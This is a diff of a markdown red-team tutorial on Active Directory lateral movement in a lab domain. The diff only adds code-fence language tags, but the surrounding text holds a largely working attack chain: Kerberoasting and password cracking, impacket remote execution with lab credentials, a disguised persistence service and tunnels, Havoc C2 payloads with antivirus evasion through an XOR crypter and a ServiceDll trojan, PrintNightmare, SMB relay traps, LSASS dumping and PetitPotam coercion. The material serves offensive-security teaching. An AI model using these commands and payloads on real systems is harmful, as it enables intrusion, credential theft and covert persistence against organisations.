@@ -206,13 +206,13 @@ ip rule add fwmark 0x01 lookup 100 -> (add a rule to packets marked as 1 to be r
 
 Now, we can reestablish the proxy using the `tproxy` method as part of our setup. This will enable the necessary communication for the clock synchronization.
 
-```
+```bash
 sshuttle -r node-api@192.168.57.8 10.10.24.0/24 --ssh-cmd "ssh -i ./id_rsa" --method=tproxy -v
 ```
 
 Once the proxy is set up, we can proceed to send UDP clock synchronization packets to the Domain Controller and receive its current time.
 
-```
+```bash
 rdate -n 10.10.24.250
 ```
 
@@ -220,7 +220,7 @@ rdate -n 10.10.24.250
 
 In order to extract the hashes from TGS, we will make use of the impacket library.
 
-```
+```bash
 git clone https://github.com/fortra/impacket.git
 cd impacket
 pip3 install -r requirements.txt 
@@ -228,7 +228,7 @@ pip3 install -r requirements.txt
 
 Once the Impacket library is installed, we can make use of its `examples` scripts to obtain user Service Account Ticket Granting Service (TGS) tickets.
 
-```
+```bash
 ./GetUserSPNs.py -request -dc-ip 10.10.24.250 'democorp.com/j.arnold:F4ll2023!' 
 ```
 
@@ -244,7 +244,7 @@ Additionally, for optimized performance, we can take advantage of a custom kerne
 
 The ruleset used during this attempt is https://github.com/stealthsploit/OneRuleToRuleThemStill
 
-```
+```powershell
 PS E:\hash\hashcat-6.2.3> .\hashcat.exe -m 13100 ..\badgesvc.txt ..\rockyou.txt -r .\rules\NSA.rule -O
 ```
 
@@ -254,7 +254,7 @@ PS E:\hash\hashcat-6.2.3> .\hashcat.exe -m 13100 ..\badgesvc.txt ..\rockyou.txt 
 
 The password, `Perfection123!` has been successfully cracked in just 3 minutes using a combination of a mobile laptop RTX3060 GPU, Ryzen 7 CPU, and an AMD integrated graphics card. We can display the cracked password once more using the following command:
 
-```
+```powershell
 PS E:\hash\hashcat-6.2.3> .\hashcat.exe -m 13100 ..\badgesvc.txt --show
 ```
 
@@ -262,7 +262,7 @@ PS E:\hash\hashcat-6.2.3> .\hashcat.exe -m 13100 ..\badgesvc.txt --show
 
 Now that we have the password for the service account, let's attempt to use it across domain computers and check if this service account was a local administrator account on one of them.
 
-```
+```bash
 crackmapexec smb -u BadgeService -p 'Perfection123!' -d democorp.com ./hosts.txt
 ```
 
@@ -304,7 +304,7 @@ PsExec is a widely used tool within the Impacket library. It's named after the t
 
 To use PsExec effectively, we require credentials such as a hash, or a username and password of a user with administrator privileges of the target machine. After execution, due to being executed by service, we obtain `nt authority/system` (root) privileges over that machine. PsExec contains `lput`, and `lget` built in shell commands to upload and download files.
 
-```
+```bash
 ./psexec.py -codec cp866 'democorp.com/BadgeService:Perfection123!@10.10.24.100' -dc-ip 10.10.24.250
 ```
 
@@ -328,7 +328,7 @@ Another tool we can utilize is `smbexec`. Instead of uploading an executable and
 
 After execution we gain `nt authority\system` privileges over the target machine.
 
-```
+```powershell
 ./smbexec.py -codec cp866 'democorp.com/BadgeService:Perfection123!@10.10.24.100' -dc-ip 10.10.24.250
 
 $ whoami /all
@@ -351,7 +351,7 @@ It's important to note that unlike `smbexec` or `psexec`, `wmiexec` does not gra
 
 The `wmiexec` command is the counterpart to `wmic` command on Windows.
 
-```
+```powershell
 ./wmiexec.py -codec cp866 'democorp.com/BadgeService:Perfection123!@10.10.24.100' -dc-ip 10.10.24.250
 
 $ whoami /all
@@ -375,7 +375,7 @@ Atexec.py connects to the target host via RPC and leverages the Task Schedule Se
 
 This process ultimately grants us `nt authority\system` privileges on the compromised machine, but requires us to specify the target command before execution, as it does not employ a semi-interactive shell.
 
-```
+```powershell
 ./atexec.py 'democorp.com/BadgeService:Perfection123!@10.10.24.100' 'whoami /all' -dc-ip 10.10.24.250 -codec cp866
 
 $ whoami /all
@@ -398,7 +398,7 @@ The  `dcomexec` and `wmiexec` share a similar objective of executing commands on
 
 With `dcomexec`, the shell that we use is semi-interactive. During execution of `dcomexec`, we must provide the DCOM object to use for remote code execution. DCOMExec contains `lput`, and `lget` built in shell commands to upload and download files.
 
-```
+```powershell
 ./dcomexec.py -object MMC20 'democorp.com/BadgeService:Perfection123!@10.10.24.100' 
 
 $ whoami /all
@@ -422,7 +422,7 @@ When used against Domain Controller, we can employ a DCSync credential extractio
 
 Given we steal the SAM, SYSTEM, SECURITY **and/or** NTDS.dit files, we can dump the hashes offline using this tool too.
 
-```
+```bash
 ./secretsdump.py 'democorp.com/BadgeService:Perfection123!@10.10.24.100' -dc-ip 10.10.24.250
 ```
 
@@ -447,7 +447,7 @@ This attack is possible when pre-authentication is disabled, allowing the KDC to
 
 In order to perform AS-REP roasting, we will use impacket scripts once again (`GetNPNUsers.py)`. 
 
-```
+```bash
 ./GetNPUsers.py 'democorp.com/j.arnold:F4ll2023!' -dc-ip 10.10.24.250 -request -format hashcat
 ```
 
@@ -455,7 +455,7 @@ In order to perform AS-REP roasting, we will use impacket scripts once again (`G
 
 We've obtained the encrypted Ticket Granting Ticket, which can now be cracked using hashcat.
 
-```
+```bash
 .\hashcat.exe -m 18200 ..\jbird.txt ..\rockyou.txt -r .\rules\NSA.rule -O
 ```
 
@@ -465,7 +465,7 @@ We've obtained the encrypted Ticket Granting Ticket, which can now be cracked us
 
 The cracking attempt took 6 minutes and exposed the password as `Sunnyday123!`. This password can now be passed within the domain.
 
-```
+```bash
 crackmapexec smb -u 'jbird' -p 'Sunnyday123!' -d democorp.com ./hosts.txt
 ```
 
@@ -514,7 +514,7 @@ We will first establish persistence by creating a rogue Local Administrator acco
 
 Let's start from creating a rogue system administrator account, and enabling RDP. The user name is going to be `helpdesk` to not raise much suspicion.
 
-```
+```bash
 ┌──(root㉿kali)-[/home/kali/lateralmovement/impacket/examples]
 └─# ./wmiexec.py -codec cp866 'democorp.com/BadgeService:Perfection123!@10.10.24.100'
 
@@ -536,7 +536,7 @@ netsh advfirewall firewall add rule name="Remote Desktop 3389" dir=in action=all
 ## Remote Desktop
 It is now possible to connect to the remote machine using the Remote Desktop Protocol (RDP). We will use the `xfreerdp` utility for this purpose.
 
-```
+```bash
 xfreerdp /u:helpdesk /p:G3t_somehelp_br0 /v:10.10.24.100
 ```
 
@@ -550,7 +550,8 @@ Now, let's enable WinRM. To do this, search for PowerShell, and open it as an Ad
 ![](images/images38.jpg)
 
 Now in the terminal, enter the following command:
-```
+
+```powershell
 PS C:\Windows\system32> Enable-PSRemoting -Force
 ```
 
@@ -558,7 +559,7 @@ PS C:\Windows\system32> Enable-PSRemoting -Force
   
 The WinRM service is now enabled, and the corresponding firewall rules are in place. Let's connect to it using `evil-winrm`.
 
-```
+```bash
 evil-winrm -i 10.10.24.100 -u helpdesk -p G3t_somehelp_br0
 ```
 
@@ -580,14 +581,14 @@ To facilitate reverse communication with the C2, we'll set up several tunnels on
 ## Port forwarding
 
 First, lets download `chisel`.
-```
+```bash
 ┌──(kali㉿kali)-[~/lateralmovement/chisel]
 └─$ wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
 ```
 
 Next, we'll upload it to the mail server under the name "analytics."
 
-```
+```bash
 ┌──(kali㉿kali)-[~/lateralmovement/chisel]
 └─$ scp chisel/chisel_1.9.1_linux_amd64 node-api@192.168.57.8:.config/.node/analytics
  -i ./id_rsa
@@ -598,7 +599,7 @@ node-api@mail:~/.config/.node$ chmod 755 .config/.node/analytics
 Next, we will create a script that runs the chisel server on port `65499`.
 
 `@mailserver/~/.config/.node/analytics.sh`
-```
+```bash
 #!/bin/bash
 /home/node-api/.config/.node/analytics server -p 65499 --reverse
 ```
@@ -612,7 +613,7 @@ node-api@mail:~/.config/.node$ chmod 755 ./analytics.sh
 The next step is to create a user service that runs the script.
 
 `@mailserver/~/.config/systemd/user/node-analytics.service`
-```
+```conf
 [Unit]
 Description=Node.js debug analytics service
 
@@ -626,7 +627,7 @@ WantedBy=default.target
 
 Our next action is to enable and start the service.
 
-```
+```bash
 node-api@mail:~/.config/.systemd$ systemctl --user enable node-build
 node-api@mail:~/.config/.systemd$ systemctl --user start node-build
 ```
@@ -634,21 +635,22 @@ node-api@mail:~/.config/.systemd$ systemctl --user start node-build
 Now, we can configure several port forwards and incorporate the necessary command into a script.
 
 `@kali/~/portfwd.sh`
-```
+```bash
 #!/bin/bash
 ./chisel_1.9.1_linux_amd64 client 192.168.57.8:65499 R:65500:0.0.0.0:65500 R:65510:0.0.0.0:65510 R:65520:0.0.0.0:65520 R:65530:0.0.0.0:65530
 ```
 
 Following the setup, let's execute the script.
-`@kali/~/`
-```
+
+```bash
 ┌──(kali㉿kali)-[~/lateralmovement/chisel]
 └─$ chmod 755 portfwd.sh
 ./portfwd.sh
 ```
 
 Let's check if the tunnel works.
-```
+
+```bash
 ┌──(kali㉿kali)-[~/lateralmovement/chisel]
 └─$ nc -lvnp 65520
 nc 192.168.57.8 65520
@@ -663,29 +665,31 @@ You can follow the installation steps on this website https://havocframework.com
 
 After installation, run the team server. We can also modify the profile, or view the password in the selected profile file. By default, the user will be `Neo`, and his password `password1234`. Havoc is blazingly fast, as its' server was written in Rust language.
 
-```
+```bash
 ./havoc server --profile ./profiles/havoc.yaotl -v --debug
 ```
 
 And following that, run the client server, and authenticate.
-```
+
+```bash
 ./havoc client
 ```
 
 At the base of our actions, we need a listener. Click on a View tab, and select Listeners. After that, click on Add button and provide needed information. Our changes will be:
 
-```
+```yml
 Name: MAIN
 Payload: Https
 Hosts: 192.168.57.9, 10.10.24.9
 Host (bind): 0.0.0.0
-PortBind:65500
-PortConn:65500
+PortBind: 65500
+PortConn: 65500
 Host header: Microsoft Analytics Engine 1.0
 ```
 
 Next, generate payload under Attack > Payload. Our changes will be:
-```
+
+```yml
 Format: Windows Exe
 Jitter: 10
 Indirect syscall: Checked
@@ -694,6 +698,7 @@ Sleep technique: Zilean
 Proxy Loading: RtlQueueWorkItem
 Amsi/Etw Patch: Hardware breakpoints
 ```
+
 And then click generate.
 
 ![](images/images43.jpg)
@@ -720,7 +725,7 @@ We want this malware to stay undetected, and the more changes we make to the bin
 
 As we can see, detection rate is too high as Microsoft Defender has detected the payload. The payload has been signatured into the oblivion. Let's transfer the .dll onto a **Flare VM** (https://github.com/mandiant/flare-vm) machine and do some operations on it. We can share the file using Python HTTP server, and download it straight on Flare VM.
 
-```
+```bash
 ┌──(root㉿kali)-[/home/kali/Desktop]
 └─# python3 -m http.server                             
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -729,7 +734,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Our next step is to recompile the shellcode with Donut (https://github.com/TheWover/donut).
 Donut is a tool that allows to extract position-independent shellcode from binaries, and for example compresses it, encrypts it, or adds other functionality such as AMSI patch, ETW patch, or WLDP patch. The shellcode can be then injected into memory of another process (for example using C2), or using a custom loader/injector.
 
-```
+```bash
 wget http://<kali-ip>:8000/demon.x64.exe -outfile demon.x64.exe
 wget https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -outfile donut.zip
 .\donut.exe -a 3 -z 4 -i demon.x64.exe
@@ -741,7 +746,7 @@ In our case, let's get inspired by this article (https://www.ired.team/offensive
 
 Let's create a new Microsoft Visual Studio project - select C++, and include the shellcode in the binary resources, like in linked article.
 
-```
+```cpp
 #include "pch.h"
 #include <iostream>
 #include <Windows.h>
@@ -782,7 +787,7 @@ You can access the code on my GitHub: [https://github.com/krystianbajno](https:/
 
 Let's encrypt the payload using a Python script. In our Python script, we'll begin by encrypting a payload using a basic XOR crypter. While XOR encryption is not suitable for securing sensitive data, it effectively obfuscates content to avoid antivirus detection. The only scenario where XOR is fully secure is the "One Time Pad" encryption, where the key length matches the content and is used once (learn more: [https://en.wikipedia.org/wiki/One-time_pad](https://en.wikipedia.org/wiki/One-time_pad)). In our case, we'll use a 512-bit key.
 
-```
+```python
 # XOR encryption key (replace with your own)
 key_hex = "4f130123a70d83b551efed9191e71a30ef5ed5dc660c5cbe8fc468547de2425c62345e470706d3566d046a467b71000160d119efe51a63286d04de4d5cad3159"
 
@@ -816,7 +821,7 @@ print(f"[ENCRYPTED TO]\r\n{encrypted_payload[:512]}")
 
 Time to run the crypter.
 
-```
+```powershell
 python .\crypter.py
 PS C:\Users\admin\Desktop\donut> dir | findstr datastore
 -a----        23.10.2023     14:55          87076 datastore.bin
@@ -828,7 +833,7 @@ We have successfully encrypted the payload.
 ## Key distribution
 Now, we'll set up a basic key distribution server using a TCP socket. When a client connects, it will receive the encryption key over an unencrypted TCP connection.
 
-```
+```python
 import socket
 
 # Configure host and port, match port with previously created tunnel
@@ -860,7 +865,7 @@ while True:
 
 Let's test the server.
 
-```
+```powershell
 # powershell
 $buffer = New-Object byte[] 64 # 512 bit key
 $client = New-Object System.Net.Sockets.TcpClient # create tcp client
@@ -881,7 +886,7 @@ Key distribution server works.
   
 To execute the DLL during debugging, our next step involves creating an executable that loads the .dll. Then, we'll set up this executable as the one responsible for running the .dll in Visual Studio's debug configuration.
 
-```
+```c++
 #include <iostream>
 #include <Windows.h>
 
@@ -972,13 +977,15 @@ This code will serve as a basic Service Handler, and there's no need to insert t
 Prior to proceeding, it is crucial to adjust the IP address to correspond with the `Key Distribution` server and specify a `keyFile` for storing the file. We will choose to place the key in the hidden `ProgramData` directory, which is reserved for shared program data.
 
 Revise the IP, path, injected process, and compile the code.
-```
+
+```c++
 const char* keyFile = "C:\\ProgramData\\node.cache";
 const char* serverAddress = "10.10.24.9";
 ```
 
 We should now package the Key Distribution script and the .dll, and transfer them to Kali using a Python HTTP server.
-```
+
+```bash
 python -m http.server
 ```
 
@@ -989,7 +996,8 @@ The package can now be downloaded using the browser.
 ![](images/images59.jpg)
 
 Now, it's time to execute the key distributor on Kali. The trojan will download decryption key over the tunnel we've set up earlier.
-```
+
+```bash
 python ./key_distributor.py
 ```
 
@@ -997,16 +1005,17 @@ python ./key_distributor.py
 
 Following that, we will establish a connection to the compromised machine over WINRM and upload the .dll to `C:\Windows\system32\nodeapi.dll`.
 
-```
+```bash
 evil-winrm -i 10.10.24.100 -u helpdesk -p G3t_somehelp_br0
 
 *Evil-WinRM* PS C:\Users\helpdesk\Documents> upload nodeapi.dll C:\Windows\system32\nodeapi.dll
 ```
+
 ![](images/images61.jpg)
 
 Next, we'll establish an RDP connection to the target machine, create a new service launching svchost.exe, and modify the registry to indicate that the service employs a ServiceDll, directing it to our .DLL file.
 
-```
+```powershell
 xfreerdp /u:helpdesk /p:G3t_somehelp_br0 /v:10.10.24.100
 
 sc create NodeApi binPath= "C:\Windows\System32\svchost.exe -k DcomLaunch" type= share start= auto DisplayName= "Windows Node Service"
@@ -1023,7 +1032,7 @@ Next, we must modify the Svchost DcomLaunch key in the following location `HKLM\
 
 With all the configuration in place, we can start the service now.
 
-```
+```bat
 sc start NodeApi
 ```
 
@@ -1063,7 +1072,7 @@ We will be substituting a missing DLL with ours, and rerouting all associated ca
 
 To accomplish this, first we'll upload the `SysInternals ProcessMonitor` utility to the target machine using the WINRM backdoor we've set up earlier.
 
-```
+```powershell
 *Evil-WinRM* PS C:\Users\helpdesk\Documents> upload /home/kali/lateralmovement/Procmon64.exe pm64.exe
 ```  
 
@@ -1084,7 +1093,7 @@ As observed, the `wmiprvse.exe` executable attempts to load `C:\Windows\System32
 
 Now, let's download the `wmiprvse.exe` executable via WINRM and load it into FLAREVM's Ghidra ([https://ghidra-sre.org/](https://ghidra-sre.org/)) to examine the DLL export function calls being invoked.
 
-```
+```powershell
 *Evil-WinRM* PS C:\Users\helpdesk\Documents> download C:\Windows\system32\wbem\wmiprvse.exe
 ```
 
@@ -1121,21 +1130,24 @@ Now, we can see, that the domain administrator has logged in to the computer, an
 ![](images/images75.jpg)
 
 We were able to connect to the Domain Controller over SMB using the Kerberos authentication.
-```
+
+```bat
 dir \\democorp-dc.democorp.com\C$
 ```
 
 ![](images/images76.jpg)
 
 As well as extract the ticket from this computer and save it for later use.
-```
+
+```bat
 klist /all
 ```
 
 ![](images/images77.jpg)
 
 And execute commands on the Domain Controller as a Domain Administrator.
-```
+
+```bash
 cat ticket | base64 -d > ticket1 # base64 decode the ticket
 
 ticketConverter.py ./ticket1 ticket.ccache # convert the ticket to Linux format
@@ -1150,7 +1162,8 @@ smbexec.py democorp-dc.democorp.com -k -no-pass -target-ip 10.10.24.250 -dc-ip 1
 ![](images/images78.jpg)
 
 With `NT Authority/System` privileges.
-```
+
+```bat
 whoami /all
 ```
 
@@ -1192,7 +1205,7 @@ As of 2023 - when **all** the patches are applied, this vulnerability is no long
 
 To detect the vulnerability, we could use the Impacket library. We'd connect to the RPC service on the machines and search for relevant information, to check if `MS-RPN` or `MS-PAR` services were enabled.
 
-```
+```bash
 rpcdump.py @10.10.24.100 | egrep "MS-RPN|MS-PAR"
 rpcdump.py @10.10.24.101 | egrep "MS-RPN|MS-PAR"
 rpcdump.py @10.10.24.102 | egrep "MS-RPN|MS-PAR"
@@ -1205,9 +1218,10 @@ As we can see, machines  `.100,.101,.102` might be vulnerable to Print Nightmare
 In order to successfully exploit the vulnerability in the internal network environment, we will need to tunnel the traffic into our SMB share and hijack the TCP SMB port traffic on one of the machines.
 
 Let's create a tunnel from the mail server's port `64000` to our local machine's SMB port.
-```
+
+```powershell
 ┌──(root㉿kali)-[/home/kali/lateralmovement/chisel]
-└─# ./chisel_1.9.1_linux_amd64 client 192.168.57.8:65499 R:64000:0.0.0.0:445
+└─$ ./chisel_1.9.1_linux_amd64 client 192.168.57.8:65499 R:64000:0.0.0.0:445
 ```
 
 ![](images/images83.jpg)
@@ -1241,10 +1255,11 @@ Now, we need to hijack the SMB connection and redirect the traffic to our tunnel
 
 Let's generate the implant.
 
-```
+```bash
 $ curl https://sliver.sh/install | sudo bash
 $ wget https://github.com/MrAle98/Sliver-PortBender/releases/download/v0.0.1/SliverPortBender.zip
 $ sliver
+
 sliver armory # initialize sliver extension engine
 sliver > extensions install /home/kali/lateralmovement/sliver-extension # install extension
 sliver > generate --http 10.10.24.9:65530 --save /home/kali/lateralmovement --os windows # generate the agent
@@ -1255,7 +1270,7 @@ sliver > http --lport 65530 # start an http listener on port 65530
 
 After we've uploaded and installed the `WinDivert64.sys` driver, modified our custom '.dll' to include a Sliver implant resource (or added an exception to Windows Defender with the command: `Add-MpPreference -ExclusionPath '<PATH>'` 😉), and executed the implant on the target machine, we can proceed to perform TCP hijacking with `PortBender`.
 
-```
+```bash
 [*] Session 70463f0f RIGHT_KARATE - 127.0.0.1:38870 (SERVICE) - windows/amd64 - Thu, 26 Oct 2023 16:10:50 CEST
 sliver > use 70463f0f
 [*] Active session RIGHT_KARATE (70463f0f-a561-40a4-8c8b-d503eff67d27)
@@ -1279,12 +1294,12 @@ sliver (RIGHT_KARATE) > portbender list
 We can also hijack ports using `divertTCPconn` ([https://github.com/Arno0x/DivertTCPconn](https://github.com/Arno0x/DivertTCPconn)) or `StreamDivert` ([https://github.com/jellever/StreamDivert](https://github.com/jellever/StreamDivert)) as alternatives to the PortBender addon or C2. Here's a screenshot to demonstrate how they work. For demonstration purposes (and to capture interactive output), it was more effective to showcase this over RDP, although you can modify the project, compile the .exe, and inject it directly into memory - you will still need to plant the driver on the disk.
 
 `config.txt`
-```
+```bash
 tcp < 445 0.0.0.0 -> 10.10.24.100 64000 # divert SMB 445 to 64000
 ```
 
 `StreamDivert.exe`
-```
+```bash
 StreamDivert.exe config.txt -f
 ```
 
@@ -1298,13 +1313,13 @@ This method is handy for hijacking SMB connections, obtaining hashes, and potent
 
 Next, download the PrintNightmare repository from [https://github.com/ly4k/PrintNightmare](https://github.com/ly4k/PrintNightmare) and create a .dll file for the Print Spooler service to execute, taking inspiration from John Hammond's example at [https://github.com/JohnHammond/CVE-2021-34527/blob/master/nightmare-dll/nightmare/dllmain.cpp](https://github.com/JohnHammond/CVE-2021-34527/blob/master/nightmare-dll/nightmare/dllmain.cpp). Additionally, let's add the user to more groups, and modify registry to allow remote commands.
 
-```
+```bash
 git clone https://github.com/ly4k/PrintNightmare.git
 git clone https://github.com/JohnHammond/CVE-2021-34527.git
 ```
 
 `nightmare.cpp`
-```
+```c++
 #include "pch.h"
 #include <Windows.h>
 #include <lm.h>
@@ -1358,14 +1373,14 @@ BOOL APIENTRY DllMain(
 
 Now let's set up anonymous SMB share hosting the file using Impacket's `smbserver.py`.
 
-```
+```bash
 ┌──(root㉿kali)-[/home/kali/lateralmovement/impacket/examples]
-└─# ./smbserver.py share `pwd` -smb2support
+└─$ ./smbserver.py share `pwd` -smb2support
 ```
 
 Our final step is to execute the exploit. Let's use the credentials we've discovered in the beginning and check how the output looks for a machine that is fully patched and not vulnerable to the exploit.
 
-```
+```bash
 python3 printnightmare.py 'democorp.com/j.arnold:F4ll2023!@10.10.24.102' -dll '\\10.10.24.100\share\adduser.dll'
 ```
 
@@ -1384,7 +1399,7 @@ python3 printnightmare.py 'democorp.com/j.arnold:F4ll2023!@10.10.24.101' -dll '\
 
 The .101 machine has been compromised and successfully executed our payload, resulting in creating a local administrator user and disabling Remote UAC. Now we can dump the hashes from the machine.
 
-```
+```bash
 ./secretsdump.py 'helpdesk:G3t_somehelp_br0@10.10.24.101' -dc-ip 10.10.24.250
 ```
 
@@ -1446,9 +1461,11 @@ In the event that a machine hosting a legitimate share is fully compromised (and
 ## Detection
 
 To detect which machines are vulnerable, we can utilize `crackmapexec`.
-```
+
+```bash
 crackmapexec smb -u j.arnold -p 'F4ll2023!' -d democorp.com hosts.txt --shares
 ```
+
 ![](images/images93.jpg)
 
 As we can see, the machines` .100`, `.101`, and `.102` have SMB signing not required (`signing: False`), and the `.101` machine has a Read/Writable share called `printing` available to us.
@@ -1458,7 +1475,7 @@ As we can see, the machines` .100`, `.101`, and `.102` have SMB signing not requ
 To execute the attack, we should begin by creating a payload shortcut file first.
 
 `helpdesk.lnk`
-```
+```conf
 └─$ nano helpdesk.lnk
 
 └─$ cat helpdesk.lnk              
@@ -1470,16 +1487,18 @@ IconIndex=1
 ```
 
 Keep in mind, that newlines on Windows systems are made of `\x0d\x0a` (`\r\n`), not just `\x0A` (`\n`) like on Linux.
-```
+
+```bash
 └─$ perl -pi -e 's/\n/\r\n/' helpdesk.lnk
 ```
+
 ![](images/images94.jpg)
 
 Now let's put the file on the share, effectively setting up the trap. The file must start with `@` sign, and must end with `.url`.
 
-```
-└─$ mv helpdesk.lnk @helpdesk.url
-└─$ smbclient \\\\10.10.24.101\\printing -U democorp.com/j.arnold%F4ll2023!
+```bash
+mv helpdesk.lnk @helpdesk.url
+smbclient \\\\10.10.24.101\\printing -U democorp.com/j.arnold%F4ll2023!
 put @helpdesk.url
 ls
 ```
@@ -1488,7 +1507,7 @@ ls
 
 Now we can capture the hashes when someone opens the share, without hijacking the SMB service on the target share host. In order to fetch the icon, the user will need to authenticate with us.
 
-```
+```bash
 responder -I lo -A
 ```
 
@@ -1508,36 +1527,40 @@ No time for cracking complicated passwords. Let's relay the hashes right away as
 
 Lets configure `proxychains` - comment out the tor, and add the following line:
 `/etc/proxychains.conf`
-```
+
+```conf
 [ProxyList]
 #socks4 127.0.0.1 9050
 socks4 127.0.0.1 1080
 ```
 
 Next, let's startup the relay and attack `10.10.24.102`.
-```
+
+```bash
 ┌──(root㉿kali)-[/home/kali/lateralmovement]
-└─# cat hosts-relay.txt 
+└─$ cat hosts-relay.txt 
 10.10.24.102
 
 ┌──(root㉿kali)-[/home/kali/lateralmovement]
-└─# impacket-ntlmrelayx -tf ./hosts-relay.txt -socks -smb2support
+└─$ impacket-ntlmrelayx -tf ./hosts-relay.txt -socks -smb2support
 ```
 
 Now the user opens the share. We can immediately see, that we have a new relay available, with Domain Administrator session.
 
-```
+```bash
 ntlmrelayx > socks
 ```
+
 ![](images/images97.jpg)
 
 ### The relay session is now wrapping the authentication for commands we execute.
 
 Let's test the relay and connect to the share using `smbclient`.
-```
+
+```bash
 ┌──(root㉿kali)-[/home/kali/lateralmovement]
-└─#  proxychains smbclient //10.10.24.102/c$ -U democorp/Administrator
-You will be prompted for password. Just press enter and the relay will authenticate you
+└─$  proxychains smbclient //10.10.24.102/c$ -U democorp/Administrator
+# You will be prompted for password. Just press enter and the relay will authenticate you
 smb: \> dir
 ```
 ![](images/images98.jpg)
@@ -1545,10 +1568,12 @@ smb: \> dir
 ### We've opened the `C:\` drive on the `10.10.24.102`.
 
 Now let's try to execute a command.
-```
+
+```bash
 ┌──(root㉿kali)-[/home/kali/lateralmovement]
-└─# proxychains impacket-smbexec democorp/Administrator@10.10.24.102 -no-pass
+└─$ proxychains impacket-smbexec democorp/Administrator@10.10.24.102 -no-pass
 ```
+
 ![](images/images99.jpg)
 
 ## The machine has been compromised
@@ -1556,7 +1581,8 @@ Now let's try to execute a command.
 We've authenticated as the Administrator and executed remote command on the machine `10.10.24.102`.
 
 Now let's dump the hashes from the machine using `secretsdump`.
-```
+
+```bash
 proxychains impacket-secretsdump democorp/Administrator@10.10.24.102 -no-pass
 ```
 
@@ -1570,10 +1596,11 @@ One thing to keep in mind when it comes to relaying SSPs, is that Microsoft enab
 
 ### Let's attempt to relay back to .101 when the user originally opened the share from that machine and observe the outcome.
 
-```
-┌──(root㉿kali)-[/home/kali/lateralmovement]
+```bash
+cat hosts-relay.txt 
 10.10.24.101
 ```
+
 ![](images/images101.jpg)
 
 We cannot auth-back to the same machine the user initiated connection from. Planting the payload for example on user's desktop would not work, as the connection was initiated from the same machine.
@@ -1586,8 +1613,8 @@ We cannot auth-back to the same machine the user initiated connection from. Plan
 
 Now let's check one last thing. SMB signing is enabled on the Windows Server Domain Controller machine - what happens when we connect there?
 
-```
-└─# cat hosts-relay.txt 
+```bash
+cat hosts-relay.txt 
 10.10.24.250
 ```
 
@@ -1641,14 +1668,16 @@ After compromising the machine .101, instead of cracking the hashes, let's dump 
 After the release of Windows 8.1 and Windows Server 2012 R2, Microsoft introduced a security feature called "LSA Protection" to safeguard the LSASS process from credential theft attacks. LSA Protection designates LSASS as a Protected Process Light (PPL), ensuring lower privilege or non-protected processes cannot access or tamper with it. The attempts to access this process are also monitored by AVs.
 
 Trying to access the LSASS process with obfuscated (like in the chapter focused on AV evasion) Mimikatz on the target would fail:
-```
+
+```c++
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 ```
 
 But it can be evaded by loading a driver, and supplementing Mimikatz with a service.
-```
+
+```c++
 mimikatz # !+
 mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # privilege::debug
@@ -1692,7 +1721,7 @@ Open the task manager, right click on the process, and press "Create Dump File".
 
 We can do the same from the terminal using the LOLBin comsvcs.dll, and create a MiniDump of memory, and we will **not** be flagged by Microsoft Defender by default, however this could be flagged by SIEMs/EDRs/other AVs.
 
-```
+```bash
 impacket-smbexec 'helpdesk:G3t_somehelp_br0@10.10.24.101' -dc-ip 10.10.24.250
 tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\ProgramData\helpdesk.dmp full
@@ -1705,7 +1734,7 @@ lget C:\ProgramData\helpdesk.dmp
 
 For offline investigation, we'll gather SAM, SYSTEM, and SECURITY hives too.
 
-```
+```powershell
 reg save HKLM\SAM "C:\ProgramData\sam"
 reg save HKLM\SECURITY "C:\ProgramData\security"
 reg save HKLM\SYSTEM "C:\ProgramData\system"
@@ -1713,10 +1742,10 @@ reg save HKLM\SYSTEM "C:\ProgramData\system"
 
 The memory dump can now be processed offline using Mimikatz.
 
-```
+```c++
 mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonPasswords full
-mimikatz # sekurlsa:ekeys
+mimikatz # sekurlsa::ekeys
 mimikatz # lsadump::sam /sam:'<sam>' /system:'<system>'
 mimikatz # lsadump::secrets /security:'<security>' /system:'<system>'
 ```
@@ -1784,7 +1813,7 @@ There are several coercion exploits available for Windows systems. These exploit
 
 For the sake of this demonstration, we will focus on coercing authentication using the "PetitPotam" exploit, which can be found at [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam). You can use the following command to trigger the authentication process on insufficiently patched machines:
 
-```
+```bash
 python3 PetitPotam.py -u j.arnold -p F4ll2023! 10.10.24.102 10.10.24.250
 ```
 
@@ -1799,11 +1828,14 @@ In addition to coercing authentication, it's essential to understand that uncons
 For instance, when the Administrator logs in over a PS-Remote session or mounts a network share on the unconstrained delegation computer, their ticket is saved in the memory, making unconstrained delegation a prime target for acquiring valuable domain credentials.
 
 Here's an example:
-```
+
+```powershell
 Enter-PSSession deleg # Initiating a PowerShell Remote Session
 ```
+
 Or:
-```
+
+```powershell
 Invoke-WebRequest http://deleg.democorp.com -UseDefaultCredentials -UseBasicParsing # Authenticating over HTTP
 ```
 
@@ -1815,7 +1847,7 @@ Once we have successfully acquired authentication and accessed the LSASS memory 
 
 You can use Mimikatz to list Kerberos tickets from the LSASS memory. 
 
-```
+```c++
 sekurlsa::tickets
 kerberos::list
 ```
@@ -1824,14 +1856,14 @@ kerberos::list
 
 We can export the tickets and download them for further exploitation and import them into session right away.
 
-```
+```c++
 sekurlsa::tickets /export
 kerberos::ptt <file>
 ```
 
 Rubeus is another tool that can aid us in extracting the tickets.
 
-```
+```powershell
 Rubeus.exe monitor /interval:1 /nowrap # Monitor and extract Kerberos tickets at regular intervals
 Rubeus.exe dump /nowrap
 ```
@@ -1844,7 +1876,7 @@ The ticket can be copied and pasted.
 
 And can be imported into the Kerberos session.
 
-```
+```powershell
 Rubeus.exe ptt /ticket:<ticket>
 klist
 ```
@@ -1852,7 +1884,8 @@ klist
 ![](images/images117.jpg)
 
 And afterwards we can access other computer drives.
-```
+
+```powershell
 dir \\PRINTER.democorp.com\c$
 dir \\SERVICE.democorp.com\c$
 ```
@@ -1865,7 +1898,7 @@ We could even access domain controller.
 
